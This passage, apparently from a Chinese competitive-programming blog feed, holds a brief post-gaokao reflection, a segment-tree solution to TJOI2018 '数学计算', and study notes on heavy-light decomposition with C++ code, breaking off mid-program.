<p>高考完后回家刷到结束乐队的新歌，感慨万千。我是一个平凡人，但平凡人也可以像一个傻瓜一样，书写自己的序章；像一个傻瓜一样，拥有和正常人一样的喜怒哀乐；像一个傻瓜一样，在任由命运摆布下仍怀揣希望，就像今年物理
T24，超越自己的秒速 340m。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
      </tags>
  </entry>
  <entry>
    <title>「TJOI2018」数学计算 - 线段树</title>
    <url>/tjoi2018-cal/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4588">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2573">LibreOJ 链接</a></p>
<p>小豆现在有一个数 <span class="math inline">\(x\)</span> ，初始值为
<span class="math inline">\(1\)</span> 。 小豆有 <span
class="math inline">\(Q\)</span> 次操作，操作有两种类型:</p>
<ul>
<li><p><code>1 m</code>： <span class="math inline">\(x = x \times
m\)</span> ，输出 <span class="math inline">\(x \bmod M\)</span>
；</p></li>
<li><p><code>2 pos</code>： <span class="math inline">\(x = x /\)</span>
第 <span class="math inline">\(pos\)</span> 次操作所乘的数（保证第 <span
class="math inline">\(pos\)</span> 次操作一定为类型 1，对于每一个类型 1
的操作至多会被除一次），输出 <span class="math inline">\(x\bmod
M\)</span> 。</p></li>
</ul>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这道题由于 <span class="math inline">\(M\)</span>
不一定是质数，我们无法用逆元解。于是我们可以将乘的数都存起来。</p>
<p>我们可以开一颗线段树，对于第 <span class="math inline">\(i\)</span>
次询问：</p>
<ul>
<li>类型 <span class="math inline">\(1\)</span>：在线段树第 <span
class="math inline">\(i\)</span> 点赋值为 <span
class="math inline">\(m\)</span>；</li>
<li>类型 <span class="math inline">\(2\)</span>：在线段树第 <span
class="math inline">\(\text{pos}\)</span> 点赋值为 <span
class="math inline">\(1\)</span>。</li>
</ul>
<p>线段树维护区间乘积，每次操作输出整颗线段树的乘积即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Q, M;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegT</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegT *lc, *rc;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">const</span> <span class="type">int</span> pos, <span class="type">const</span> <span class="type">long</span> <span class="type">long</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos &gt; <span class="keyword">this</span>-&gt;r || pos &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pos == <span class="keyword">this</span>-&gt;l &amp;&amp; pos == <span class="keyword">this</span>-&gt;r) val = delta;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            lc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            rc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            val = lc-&gt;val * rc-&gt;val % M;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; <span class="keyword">this</span>-&gt;r || r &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &lt;= <span class="keyword">this</span>-&gt;l &amp;&amp; r &gt;= <span class="keyword">this</span>-&gt;r) <span class="keyword">return</span> val;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> lc-&gt;<span class="built_in">query</span>(l, r) * rc-&gt;<span class="built_in">query</span>(l, r) % M;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="built_in">build</span>(l, mid), <span class="built_in">build</span>(mid + <span class="number">1</span>, r));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *segment;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;Q, &amp;M);</span><br><span class="line"></span><br><span class="line">        segment = SegT::<span class="built_in">build</span>(<span class="number">1</span>, Q);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= Q; i++) &#123;</span><br><span class="line">            <span class="type">int</span> op;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> m;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %lld&quot;</span>, &amp;op, &amp;m);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op == <span class="number">1</span>) segment-&gt;<span class="built_in">update</span>(i, m);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>) segment-&gt;<span class="built_in">update</span>(m, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, segment-&gt;<span class="built_in">query</span>(<span class="number">1</span>, Q));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>数据结构</tag>
        <tag>线段树</tag>
        <tag>TJOI</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title>树链剖分学习笔记</title>
    <url>/tree-chain-split-notes/</url>
    <content><![CDATA[<p>树链剖分是一个很常见的处理树上问题的算法，但之前一直没学
/kk，现在终于把这个坑补了。</p>
<p>这里只讲了重链剖分，不涉及其他剖分方式。</p>
<h1 id="概念">概念</h1>
<p>树链剖分是一种把树上问题转化为序列问题的算法。它可以将树上的一条路径所经过的点用序列中的若干条区间表示。</p>
<p>首先我们需要知道几个概念：重儿子、轻儿子、重边、轻边。我们定义对于一个节点
<span class="math inline">\(u\)</span> 的儿子为 <span
class="math inline">\(v\)</span>，我们定义以 <span
class="math inline">\(v\)</span> 为根的子树中节点最多的子树所对应的
<span class="math inline">\(v\)</span> 为重儿子，其余的 <span
class="math inline">\(v\)</span>
为轻儿子。父亲连向重儿子的边为重边，父亲连向轻儿子的边为轻边。如果同时有多个以
<span class="math inline">\(v\)</span>
为根的子树节点数相同且最大，则选取任意一个 <span
class="math inline">\(v\)</span>
为重儿子，其余为轻儿子。这样对于每个非叶节点，我们都有一个重儿子和一个重边。</p>
<span id="more"></span>
<p>接下来以下列的图举例（图片引用自 OI Wiki）：</p>
<p><img src="https://oi-wiki.org/graph/images/hld.png" /></p>
<h2 id="重链及其性质">重链及其性质</h2>
<p>同时我们定义重链为由重边组成的极大的链，即以一条重边延伸出只有重边且最大的链。如上图中绿框所示。我们可以很容易地得出树上每个点属于且仅属于一条重链。于是我们可以将树上问题转化成重链上的问题。</p>
<p>我们可以发现，对于每个轻儿子，其子树大小至多为父亲的 <span
class="math inline">\(\frac{1}{2}\)</span>。又通过 LCA
的思想，我们可以得出重链的一个性质：对于树上任意一条路径，所经过的点可被拆分成不超过
<span class="math inline">\(\log n\)</span>
条重链（头尾的重链可不完整）。于是我们可以将路径问题转化为 <span
class="math inline">\(\log n\)</span> 条序列上的问题。</p>
<p>接下来我们需要将数转化为序列，这里我们可以使用 DFS
序，<strong>且遍历时优先遍历重儿子</strong>，这样每条重链就可保证在序列中是连续的。</p>
<h1 id="实现方式">实现方式</h1>
<p>我们将求出树上所有重链的操作叫做剖分。</p>
<h2 id="节点定义">节点定义</h2>
<p>首先对于每个节点，我们需要维护它的子树大小，DFS
序，深度以及所在的重链、父节点和重儿子。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Chain</span> *chain;</span><br><span class="line">    <span class="type">int</span> size, dfn, depth;</span><br><span class="line">    Node *fa, *ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="剖分">剖分</h2>
<p>对于树链剖分问题，我们可以先将这棵树进行两次 DFS 以进行剖分。第一次
DFS 求出每颗子树的大小，第二次 DFS
则求出每个点的重儿子。由于我们可以得出每个轻儿子必为重链的开头，于是我们存重链时仅需存储其深度最小的节点，且每遍历到一个轻节点就新建重链，每遍历到一个重节点就将其归入父亲的重链。于是我们可以在第二次
DFS 时同时将树进行剖分。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Chain</span> &#123;</span><br><span class="line">    Node *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Chain</span>(Node *top) : <span class="built_in">top</span>(top) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(Node *v, Node *fa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    v-&gt;size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t == fa) <span class="keyword">continue</span>;</span><br><span class="line">        e.t-&gt;fa = v;</span><br><span class="line">        e.t-&gt;depth = v-&gt;depth + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs1</span>(e.t, v);</span><br><span class="line">        v-&gt;size += e.t-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> (!v-&gt;ch || v-&gt;ch-&gt;size &lt; e.t-&gt;size) v-&gt;ch = e.t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> ts = <span class="number">0</span>;</span><br><span class="line">    v-&gt;dfn = ++ts;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!v-&gt;fa || v != v-&gt;fa-&gt;ch) v-&gt;chain = <span class="keyword">new</span> <span class="built_in">Chain</span>(v);</span><br><span class="line">    <span class="keyword">else</span> v-&gt;chain = v-&gt;fa-&gt;chain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v-&gt;ch) <span class="built_in">dfs2</span>(v-&gt;ch);</span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t-&gt;fa == v &amp;&amp; e.t != v-&gt;ch) &#123;</span><br><span class="line">            <span class="built_in">dfs2</span>(e.t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">split</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    v-&gt;depth = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">dfs1</span>(v);</span><br><span class="line">    <span class="built_in">dfs2</span>(v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="维护序列">维护序列</h2>
<p>接下来我们就可在 DFS 序上操作了。对于每个点 <span
class="math inline">\(u\)</span>，在序列 <span
class="math inline">\(a\)</span> 上对应的是 <span
class="math inline">\(a_{\text{dfn}_u}\)</span>（<span
class="math inline">\(\text{dfn}_u\)</span> 为 <span
class="math inline">\(u\)</span> 的 DFS
序）。我们这里可以选择线段树维护（实际上选择其它任意数据结构均可）。</p>
<p>这时我们求路径的时候可以使用类似于倍增求 LCA
的思想：看两个重链开头的深度，然后更深的往上跳到父亲的重链，同时将这条重链纳入统计。最后跳到同一重链后将两点之间路径纳入统计即可。时间复杂度为
<span class="math inline">\(O(n \log n)\)</span>。代码演示如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">update</span><span class="params">(Node *u, Node *v, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (u-&gt;chain != v-&gt;chain) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;chain-&gt;top-&gt;depth &lt; v-&gt;chain-&gt;top-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">        segment-&gt;<span class="built_in">update</span>(u-&gt;chain-&gt;top-&gt;dfn, u-&gt;dfn, w);</span><br><span class="line">        u = u-&gt;chain-&gt;top-&gt;fa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u-&gt;depth &gt; v-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    segment-&gt;<span class="built_in">update</span>(u-&gt;dfn, v-&gt;dfn, w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">query</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (u-&gt;chain != v-&gt;chain) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;chain-&gt;top-&gt;depth &lt; v-&gt;chain-&gt;top-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">        res += segment-&gt;<span class="built_in">query</span>(u-&gt;chain-&gt;top-&gt;dfn, u-&gt;dfn);</span><br><span class="line">        u = u-&gt;chain-&gt;top-&gt;fa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u-&gt;depth &gt; v-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    res += segment-&gt;<span class="built_in">query</span>(u-&gt;dfn, v-&gt;dfn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="求-lca">求 LCA</h2>
<p>用树链剖分也可以求 LCA，且比倍增求 LCA
更快，常数小。方法和上述维护序列类似，这就不赘述了。</p>
<h1 id="例题">例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P3384">洛谷
P3384「模板」轻重链剖分/树链剖分</a></p>
<p>这道题是树链剖分模板，同时加了子树操作。在 DFS
序中子树中所有节点是连续的，且开头必为根节点，所以我们只需要查询或修改线段树中的子树所在区间即可。即为
<code>segment-&gt;query(nodes[v].dfn, nodes[v].dfn + nodes[v].size - 1)</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Chain</span> *chain;</span><br><span class="line">    <span class="type">int</span> size, dfn, depth;</span><br><span class="line">    Node *fa, *ch;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Chain</span> &#123;</span><br><span class="line">    Node *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Chain</span>(Node *top) : <span class="built_in">top</span>(top) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    u-&gt;e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(u, v));</span><br><span class="line">    v-&gt;e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(v, u));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(Node *v, Node *fa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    v-&gt;size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t == fa) <span class="keyword">continue</span>;</span><br><span class="line">        e.t-&gt;fa = v;</span><br><span class="line">        e.t-&gt;depth = v-&gt;depth + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">dfs1</span>(e.t, v);</span><br><span class="line">        v-&gt;size += e.t-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> (!v-&gt;ch || v-&gt;ch-&gt;size &lt; e.t-&gt;size) v-&gt;ch = e.t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> ts = <span class="number">0</span>;</span><br><span class="line">    v-&gt;dfn = ++ts;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!v-&gt;fa || v != v-&gt;fa-&gt;ch) v-&gt;chain = <span class="keyword">new</span> <span class="built_in">Chain</span>(v);</span><br><span class="line">    <span class="keyword">else</span> v-&gt;chain = v-&gt;fa-&gt;chain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v-&gt;ch) <span class="built_in">dfs2</span>(v-&gt;ch);</span><br><span class="line">    <span class="keyword">for</span> (Edge &amp;e : v-&gt;e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.t-&gt;fa == v &amp;&amp; e.t != v-&gt;ch) &#123;</span><br><span class="line">            <span class="built_in">dfs2</span>(e.t);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">split</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    v-&gt;depth = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">dfs1</span>(v);</span><br><span class="line">    <span class="built_in">dfs2</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegT</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegT *lc, *rc;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> val, tag;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">tag</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">cover</span><span class="params">(<span class="type">const</span> <span class="type">long</span> <span class="type">long</span> delta)</span> </span>&#123;</span><br><span class="line">        val += (r - l + <span class="number">1</span>) * delta;</span><br><span class="line">        tag += delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tag) &#123;</span><br><span class="line">            lc-&gt;<span class="built_in">cover</span>(tag);</span><br><span class="line">            rc-&gt;<span class="built_in">cover</span>(tag);</span><br><span class="line">            tag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r, <span class="type">const</span> <span class="type">long</span> <span class="type">long</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; <span class="keyword">this</span>-&gt;r || r &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &lt;= <span class="keyword">this</span>-&gt;l &amp;&amp; r &gt;= <span class="keyword">this</span>-&gt;r) <span class="built_in">cover</span>(delta);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">pushDown</span>();</span><br><span class="line">            lc-&gt;<span class="built_in">update</span>(l, r, delta);</span><br><span class="line">            rc-&gt;<span class="built_in">update</span>(l, r, delta);</span><br><span class="line">            val = lc-&gt;val + rc-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; <span class="keyword">this</span>-&gt;r || r &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l &lt;= <span class="keyword">this</span>-&gt;l &amp;&amp; r &gt;= <span class="keyword">this</span>-&gt;r) <span class="keyword">return</span> val;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">pushDown</span>();</span><br><span class="line">            <span class="keyword">return</span> lc-&gt;<span class="built_in">query</span>(l, r) + rc-&gt;<span class="built_in">query</span>(l, r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">const</span> <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="built_in">build</span>(l, mid), <span class="built_in">build</span>(mid + <span class="number">1</span>, r));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *segment;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">update</span><span class="params">(Node *u, Node *v, <span class="type">long</span> <span class="type">long</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (u-&gt;chain != v-&gt;chain) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;chain-&gt;top-&gt;depth &lt; v-&gt;chain-&gt;top-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">        segment-&gt;<span class="built_in">update</span>(u-&gt;chain-&gt;top-&gt;dfn, u-&gt;dfn, w);</span><br><span class="line">        u = u-&gt;chain-&gt;top-&gt;fa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u-&gt;depth &gt; v-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    segment-&gt;<span class="built_in">update</span>(u-&gt;dfn, v-&gt;dfn, w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (u-&gt;chain != v-&gt;chain) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;chain-&gt;top-&gt;depth &lt; v-&gt;chain-&gt;top-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">        res += segment-&gt;<span class="built_in">query</span>(u-&gt;chain-&gt;top-&gt;dfn, u-&gt;dfn);</span><br><span class="line">        u = u-&gt;chain-&gt;top-&gt;fa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (u-&gt;depth &gt; v-&gt;depth) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    res += segment-&gt;<span class="built_in">query</span>(u-&gt;dfn, v-&gt;dfn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m, r, p;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;n, &amp;m, &amp;r, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">val</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;val[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[u], &amp;nodes[v]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">split</span>(&amp;nodes[r]);</span><br><span class="line"></span><br><span class="line">    segment = SegT::<span class="built_in">build</span>(<span class="number">1</span>, n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) segment-&gt;<span class="built_in">update</span>(nodes[i].dfn, nodes[i].dfn, val[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> op;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;op);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> u, v;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> w;</span><br><span class="line">            <span class="built_in">scanf</span>(<span 